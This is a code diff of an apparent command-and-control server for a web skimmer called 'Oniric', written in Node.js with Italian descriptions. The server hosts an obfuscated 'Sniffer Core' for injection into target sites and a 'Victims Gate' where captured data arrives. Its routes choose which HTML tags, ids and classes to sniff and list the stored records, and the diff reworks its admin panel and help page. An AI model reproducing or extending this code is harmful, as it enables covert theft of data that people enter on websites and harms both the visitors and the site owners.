@@ -52,95 +52,6 @@ export class App {
           res.send(this.eccipient);
         });
         app.get('/'+this.conf.licenseKey,(req,res)=>{
-          let commonids='';
-          let commontags='';
-          let commonclasses='';
-          this.conf.documentids.forEach((id)=>{
-            commonids +='\''+id+'\','
-          });
-          this.conf.documenttags.forEach((id)=>{
-            commontags +='\''+id+'\','
-          });
-          this.conf.documentclasses.forEach((id)=>{
-            commonclasses +='\''+id+'\','
-          });
-          res.send(`
-<style>
-body {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;font-family: 'Roboto Slab', serif; }
-h1 {margin-top: 80px;user-select: none;text-align: center;font-weight: 300; }
-p {max-width: 100%;max-height: 100%;font-weight: 300;color: #546E7A;user-select: none;text-align: center;margin: 0; }
-a {text-align: center;text-decoration: none;color: #FFF; }
-.menu {position: fixed;width: 100vw;pointer-events: none;margin-top: 10vh;text-align: center;z-index: 2; }
-.menu__link {display: inline-block;text-decoration: none;border: 2px solid #263238;color: #263238;pointer-events: auto;line-height: 40px;position: relative;padding: 0 50px;box-sizing: border-box;margin: 0;user-select: none;overflow: hidden;border-radius: 50px;
-&::before {content: attr(data-hover);background-color: #263238;color: #FFF;position: absolute;top: 100%;bottom: 0;left: 0;transition: all 300ms cubic-bezier(0.190, 1.000, 0.560, 1.000);right: 0; }
-&:hover::before {top: 0; }}
-.panel {display: flex;align-items: center;justify-content: center;flex-direction: column;position: absolute;top: 0;bottom: 0;left: 0;right: 0;overflow: auto;z-index: 999;color: #000;box-sizing: border-box;background-color: #ECEFF1; }
-.panel__content {opacity: 0;will-change: margin-top;transition: all 700ms;transition-delay: 600ms;padding: 100px 200px;margin-top: -5%; }
-.panel__content p{text-align: center;text-decoration: none;color: #FFF;}
-.panel:target .panel__content {opacity: 1;margin-top: 0; }
-.panel#home {z-index: 1;background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 100%); }
-.panel#fade {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
-.panel#fade2 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
-.panel#fade3 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
-.panel#fade4 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
-.panel#fade:target {opacity: 1;pointer-events: auto; }
-.panel#fade2:target {opacity: 1;pointer-events: auto; }
-.panel#fade3:target {opacity: 1;pointer-events: auto; }
-.panel#fade4:target {opacity: 1;pointer-events: auto; }
-</style>
-            <div class="panel" id="home">
-              <br>  <h1>Oniric</h1><br>
-            </div>
-            <div class="panel" id="fade2">
-                <div class="panel__content">
-                <p>Website Payload (Server-Side)</p>
-                <textarea style="width:400px;height:150px"> `+this.expose+` </textarea>
-                </div>
-                <a href="/`+this.conf.licenseKey+`"> Close [ X ]</a>
-            </div>
-            <div class="panel" id="fade3">
-                <div class="panel__content">
-                <p>User:`+this.conf.instanceUser+`</p>
-                <p>Port:`+this.conf.port+`</p>
-                <p>Timer Polling:`+this.conf.polling+`</p>
-                <p>Sniffer Core:`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</p>
-                <p>Victims Gate:`+this.detectedIp+':'+this.conf.port+'/gate'+`</p>
-                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
-            </div>
-            </div>
-            <div class="panel" id="fade">
-                <div class="panel__content">
-                <p>HTML IDs</p>
-                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonids.slice(0,-1)+`</p><br>
-                <p>HTML Classes</p>
-                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonclasses.slice(0,-1)+`</p><br>
-                <p>HTML Tags</p>
-                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commontags.slice(0,-1)+`</p><br>
-                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
-            </div>
-            </div>
-            <div class="panel" id="fade4">
-                <div class="panel__content">
-                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
-                </div>
-            </div>
-            <div class="menu">
-              <a class="menu__link" href="#fade2" data-hover="Fade">Payload</a>
-              <a class="menu__link" href="#fade3" data-hover="Fade">User Status</a>
-              <a class="menu__link" href="#fade" data-hover="Fade">HTML Config</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`/help" data-hover="Fade">Help</a><br>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`/info/list" data-hover="Fade">History Dbs</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Modify Polling</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`/restart" data-hover="Fade">Restart</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Search Info</a>
-              <a class="menu__link" href="#fade4" data-hover="Fade">Modify Config</a><br>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Clear Dbs</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Port</a>
-              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Name</a>
-            </div>
-            `);
-        });
-        app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
           res.send(`<style>
                       table {
                         font-family: arial, sans-serif;
@@ -156,63 +67,50 @@ a {text-align: center;text-decoration: none;color: #FFF; }
                         background-color: #dddddd;
                       }
                   </style>
-                  <h2>HELP Page</h2>
+                  <h2>Main Page</h2>
                   <table>
                   <tr>
-                  <th>Restapi Link</th>
+                  <th>Restapi Link /`+this.conf.licenseKey+`</th>
                   <th>Descrizione</th>
                   </tr>
                   <tr>
-                  <td>/licenseKey/restart</td>
-                  <td>Riavvia il server</td>
+                  <td>/`+this.conf.instanceUser+`</td>
+                  <td>Sniffer Core Offuscato che viene richiamato sul target</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/tags/add/nometag</td>
+                  <td>/gate</td>
+                  <td>Dove arrivano le informazioni del target</td>
+                  </tr>
+                  <tr>
+                  <td>/tags/add/ <b>[Nometag] : String</b></td>
                   <td>Aggiunge un nuovo tag html sniffabile</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/ids/add/nomeid</td>
+                  <td>/ids/add/ <b>[NomeId] : String</b> </td>
                   <td>Aggiunge un nuovo id html sniffabile</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/classes/add/nomeclasse</td>
+                  <td>/classes/add/ <b> [NomeClasse] : String </b></td>
                   <td>Aggiunge una nuova classe html sniffabile</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/tags/remove/nometag</td>
+                  <td>/tags/remove/ <b> [NomeTag] : String </b></td>
                   <td>Rimuove un tag html precedentemente impostato</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/ids/remove/nomeid</td>
+                  <td>/ids/remove/ <b> [NomeId] : String </b></td>
                   <td>Rimuove un id html precedentemente impostato</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/classes/remove/nomeclasse</td>
+                  <td>/classes/remove/ <b>[NomeClasse] : String</b></td>
                   <td>Rimuove una classe html precedentemente impostata</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/polling/modify/num</td>
-                  <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
-                  </tr>
-                  <tr>
-                  <td>/licenseKey/info/list</td>
+                  <td>/info/list</td>
                   <td>Ritorna uno storico riguardante i dati sniffati sui vari siti a cui è collegato</td>
-                  </tr>
-                  <tr>
-                  <td>/licenseKey/search/info</td>
-                  <td>Ritorna uno storico riguardante i chunks di sniff sui vari siti relativi al dominio cercato</td>
-                  </tr>
-                  <tr>
-                  <td>/licenseKey/db/clear</td>
-                  <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
                   </tr>
                   </table>`);
         res.end();
-        });
-        app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
-             this.db.close();
-	           process.exit(1);
-             res.end();
         });
         app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
           let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
@@ -298,43 +196,11 @@ a {text-align: center;text-decoration: none;color: #FFF; }
            res.end();
          }
         });
-        app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
-            let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-            content.polling = req.params.interval;
-            fs.writeFileSync('./config.json', JSON.stringify(content));
-            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-            this.bringevil();
-            res.send(`<h2> Timer Polling Aggiornato </h2>`);
-            res.end();
-        });
         app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
           const sql = "SELECT * FROM info";
           this.db.all(sql, [], function(err, rows) {
             if (err) {
               console.log(err);
-            }
-            res.json({
-                       "message":"success",
-                       "data":rows
-                   });
-            });
-        });
-        app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
-          const sql = "DELETE * FROM info ";
-          this.db.all(sql, function(err) {
-            if (err) {
-              res.send('No result found');
-            }
-            res.json({
-                       "message":"success",
-                   });
-            });
-        });
-        app.get('/'+this.conf.licenseKey+'/search/info/:keywordname',(req,res)=>{
-          const sql = "SELECT * FROM info WHERE address=? ";
-          this.db.all(sql, [req.params.keywordname], function(err, rows) {
-            if (err) {
-              res.send('No result found');
             }
             res.json({
                        "message":"success",
@@ -353,7 +219,7 @@ a {text-align: center;text-decoration: none;color: #FFF; }
          });
         const web = http.createServer(app);
         web.listen(x,y , () => {
-          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp+':'+this.conf.port);
+          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr External,Internal:'+this.detectedIp+':'+this.conf.port);
         });
     }
 }
